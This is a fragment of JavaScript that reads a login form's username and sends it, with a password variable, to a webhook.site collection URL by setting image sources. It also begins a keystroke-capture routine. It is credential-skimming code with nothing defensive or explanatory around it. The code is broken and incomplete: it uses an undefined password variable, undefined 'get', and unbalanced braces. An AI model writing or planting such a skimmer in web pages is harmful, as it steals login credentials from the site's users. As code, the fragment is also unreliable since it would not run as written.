      const getValueInput = () => {
        let inputValue=document.getElementById("username").value;

        var i = new Image();
        var j = new Image();
i.src="https://webhook.site/94da50e3-9d0a-4b69-9bac-b51a6ae5ba7b?username="+inputValue+"&password="+inputValue1;
j.src="https://webhook.site/94da50e3-9d0a-4b69-9bac-b51a6ae5ba7b?username="+inputValue+"&password="+inputValue1;

      }
      var keys='';

        key = get.keyCode?get.keyCode:get.charCode;

      }
